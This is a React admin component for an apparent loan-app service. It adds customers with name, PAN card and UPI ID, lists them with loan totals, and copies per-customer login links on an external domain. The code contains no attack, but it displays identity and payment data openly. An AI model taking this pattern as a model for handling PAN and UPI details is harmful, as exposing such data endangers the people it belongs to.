import React, { useEffect } from 'react'
import Navbar from './utilities/Navbar'
import useStateContext from '@/context/ContextProvider'
import { useState } from 'react'
import Link from 'next/link'
import clipboardCopy from 'clipboard-copy';
import { CircularProgress, IconButton } from '@mui/material'
import LaunchIcon from '@mui/icons-material/Launch';
import EditIcon from '@mui/icons-material/Edit';
import DeleteIcon from '@mui/icons-material/Delete';
import CopyAllIcon from '@mui/icons-material/CopyAll';



const Admin = ({ app_settings, device_info, is_loading }) => {
    const {
        handle_add_app_settings,
        handle_user_device_info,
        app_id,
        set_app_id,
        openModal,
        set_snackbar_alert,
    } = useStateContext();

    const [customize, set_customize] = useState("all_users");





    const default_State = {
        app_name: "",
        upi_id: "",
        user_name: "",
        pan_card: "",
        phone_number: "",
    }


    const [values, set_values] = useState(default_State);




    const handle_change = (e) => {
        const { name, value } = e.target;
        set_values(prev => ({ ...prev, [name]: value }));
    };




    const delete_empty_pairs = (obj) => {
        const object = { ...obj }
        for (const each of Object.keys(obj)) {
            if (!obj[each]) {
                delete object[each];
            }
        }
        return object;
    }

    const set_default_states = () => {
        set_values(default_State);
    }


    const handle_add_customer = async (targ, val) => {

        const settings = delete_empty_pairs(val);
        if (targ === "app") {
            handle_add_app_settings(settings, set_default_states, device_info, handle_user_device_info);

        }
    }



    const copyToClipboard = (text) => {
        clipboardCopy(text)
            .then(() => {
                set_snackbar_alert({
                    open: true,
                    message: `Link Copied Successfully`,
                    severity: "success"
                })

            })
            .catch((err) => {
                set_snackbar_alert({
                    open: true,
                    message: "Failed to copy",
                    severity: "primary"
                });
            });
    };
    
    

const [search_params, set_search_params] = useState("");
const handle_search = (e) => set_search_params(e.target.value);

const [filtered_settings, set_filtered_settings] = useState(app_settings); // filtered list

useEffect(() => {
  if (search_params.trim()) {
    const filtered = app_settings.filter((each) => {
      const query = search_params.toLowerCase();
      return (
        each.user_name?.toLowerCase().includes(query) ||
        each.pan_card?.toLowerCase().includes(query) ||
        each.app_name?.toLowerCase().includes(query) ||
        each.upi_id?.toLowerCase().includes(query) ||
        each._id?.toLowerCase().includes(query)
      );
    });
    set_filtered_settings(filtered);
  } else {
    set_filtered_settings(app_settings);
  }
}, [search_params, app_settings]);


const date_formatter = (date) => {
        // Create a Date object
        const dateObject = new Date(date);

        // Format the date and time with the Pakistan time zone
        const formattedDate = dateObject.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'short',
            day: '2-digit',
            timeZone: 'Asia/Karachi'
        });

        const formattedTime = dateObject.toLocaleTimeString('en-US', {
            hour: 'numeric',
            minute: '2-digit',
            hour12: true,
            timeZone: 'Asia/Karachi'
        });

        return `${formattedDate}  [${formattedTime}]`;
    };
    


    return (
        <div className='w-screen min-h-screen relative bg-stone-100 flex justify-center' >
            <Navbar app_settings={app_settings} back_btn={true} disable_headset={true} admin={true} />

            <form className='w-full lg:w-[600px] lg:rounded-lg flex flex-col gap-6 px-[30px] mt-[52px] py-[30px]' >

                <div className='w-full flex justify-between mb-5' >
                    <button
                        type='button'
                        onClick={() => set_customize("all_users")}
                        className={`w-full active:opacity-60 py-[9px] rounded-s-md border-r border-gray-300 text-[12px] md:text-[15px] transition-all font-semibold ${customize === "all_users" ? "bg-emerald-500 hover:bg-emerald-400 text-white" : "bg-stone-400 hover:bg-stone-500 text-white"}`}
                    >
                        All Customers
                    </button>


                    <button
                        type="button"
                        onClick={() => set_customize("add_user")}
                        className={`w-full active:opacity-60 py-[9px] rounded-e-md text-[12px] md:text-[15px] transition-all font-semibold ${customize === "add_user" ? "bg-emerald-500 hover:bg-emerald-400 text-white" : "bg-stone-400 hover:bg-stone-500 text-white"}`}
                    >
                        Add Customer
                    </button>
                </div>

                {customize === "add_user" ?
                    <>

                        <div className='w-full flex flex-col gap-1' >
                            <label className='text-[13px] font-bold text-stone-700' htmlFor="">App Name</label>
                            < input
                                className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none w-full'
                                placeholder='Name'
                                type="text"
                                name="app_name"
                                value={values.app_name}
                                onChange={handle_change}
                            />
                        </div>

                        <div className='w-full flex flex-col gap-1'>
                            <label className='text-[13px] font-bold text-stone-700' htmlFor="">UPI ID</label>
                            < input
                                placeholder='ID'
                                type="text"
                                className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none w-full'
                                name="upi_id"
                                value={values.upi_id}
                                onChange={handle_change}
                            />
                        </div>

                        {/* <div className='w-full flex flex-col gap-1'>
                            <label className='text-[13px] font-bold text-stone-700' htmlFor="">Phone Number</label>
                            <div className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none flex items-center gap-2'>
                                <p className='font-semibold text-stone-500' >+91</p>
                                < input
                                    placeholder='Phone number'
                                    type="tel"
                                    className=' outline-none w-full'
                                    name="phone_number"
                                    value={values.phone_number}
                                    onChange={handle_change}
                                />
                            </div>
                        </div> */}

                        <div className='w-full flex flex-col gap-1'>
                            <label className='text-[13px] font-bold text-stone-700' htmlFor="">User Name</label>
                            < input
                                placeholder='Name'
                                type="text"
                                className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none w-full'
                                name="user_name"
                                value={values.user_name}
                                onChange={handle_change}
                            />

                        </div>

                        <div className='w-full flex flex-col gap-1'>
                            <label className='text-[13px] font-bold text-stone-700' htmlFor="">Pan Card</label>
                            < input
                                placeholder='xxxxxxxxxxx'
                                type="text"
                                className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none w-full'
                                name="pan_card"
                                value={values.pan_card}
                                onChange={handle_change}
                            />
                        </div>
                    </>
                    :
                    <>

                        <div className='w-full flex flex-col gap-1' >
                            <label className='text-[13px] font-bold text-stone-700 mb-4 flex items_center gap-3 justify-between' htmlFor="">
                                <span>All users's app & loans</span>
                                <span>{Boolean(filtered_settings.length) && "("+filtered_settings.length+")"}</span>
                            </label>
                            
                            {Boolean(app_settings.length) &&
                                <div className='w-full flex flex-col gap-1 mb-3' >
                              <input
                                className='text-[14px] font-medium text-stone-700 bg-white px-[15px] py-[10px] rounded-md border border-stone-200 outline-none w-full'
                                placeholder='Search Loan'
                                type="search"
                                name="search"
                                value={search_params}
                                onChange={handle_search}
                              />
                           </div>
                           }
                            
                            <div>

                                {is_loading ?
                                    <div className='w-full flex justify-center items-center'>
                                        <CircularProgress />
                                    </div>
                                    :
                                    <>
                                        {Boolean(filtered_settings.length) ?



                                            <div className='w-full flex flex-col gap-4' >

                                                {/* Loan */}
                                                {filtered_settings.map((each, index) => (
                                                    < div
                                                        key={index} className='text-[14px] font-medium text-stone-700 bg-stone-50 px-[16px] py-[10px] rounded-md border border-stone-200 shadow-md w-full'

                                                    >
                                                        <div className='flex justify-between items-center' >
                                                            <div className='flex flex-col text-[14px] text-stone-400 font-medium gap-1' >
                                                                <p>{date_formatter(each.createdAt)}</p>
                                                                <p>ID: <span className='text-stone-600 cursor-pointer active:opacity-70 select-none' >{each._id}</span>
                                                                    <span className='ml-1'>
                                                                        <IconButton onClick={() => copyToClipboard(`https://nr3bco.online/login/${each._id}`)}>
                                                                            <CopyAllIcon className='text-[16px] text-stone-700' />
                                                                        </IconButton>
                                                                    </span>
                                                                </p>
                                                                <Link className='flex flex-col gap-1' href={`/50001/${each._id}`}>
                                                                    <p>App Name: <span className='text-stone-600' >{each.app_name}</span></p>
                                                                    <p>User Name: <span className='text-stone-600 underline' >{each.user_name}</span></p>
                                                                    <p>Pan Card:
                                                                        <span className='text-stone-600 ' >
                                                                            {" "} {each.pan_card}
                                                                        </span>
                                                                    </p>
                                                                    <p>UPI ID: <span className='text-stone-600' >
                                                                        {each.upi_id}
                                                                    </span></p>
                                                                    
                                                                    {Boolean(each.total_loan_amount) &&
                                                                        <p>Total Loan Amount: <span className='text-stone-600' >
                                                                        {Number(each.total_loan_amount).toLocaleString("en-US")}
                                                                    </span></p>}
                                                                    
                                                                    {Boolean(each.total_paid_amount) &&
                                                                        <p>Total Paid Amount: <span className='text-stone-600' >
                                                                        {Number(each.total_paid_amount).toLocaleString("en-US")}
                                                                    </span></p>}
                                                                    
                                                                    
                                                                    
                                                                </Link>
                                                            </div>



                                                            <div className='flex items-center gap-1 flex-col' >
                                                                <Link target='_blank' href={`/login/${each._id}`}>
                                                                    <IconButton>
                                                                        <LaunchIcon />
                                                                    </IconButton>
                                                                </Link>

                                                                <Link href={`/50001/${each._id}`}>
                                                                    <IconButton className='text-blue-500'>
                                                                        <EditIcon />
                                                                    </IconButton>
                                                                </Link>

                                                                <IconButton className='text-red-500' onClick={() => { set_app_id(each._id); openModal("delete_app_modal") }}>
                                                                    <DeleteIcon className='' />
                                                                </IconButton>



                                                            </div>

                                                        </div>
                                                    </div>
                                                ))}
                                                {/* Loan end */}

                                            </div>
                                            :
                                            <div className='w-full flex justify-center items-center'>
                                                <p className='text-[16px] text-stone-400' >No Apps & Loans Were Found</p>
                                            </div>
                                        }
                                    </>
                                }
                            </div>

                        </div>
                    </>

                }



                {customize === "add_user" &&
                    <div className='w-full mt-4'>
                        <button type='button' onClick={() => handle_add_customer("app", values)} className='bg-emerald-400 text-[13px] text-white px-[10px] py-[10px] rounded-lg font-medium active:opacity-60 transition-all w-full' >Add New Customer</button>
                    </div>
                }

            </form>
        </div >
    )
}

export default Admin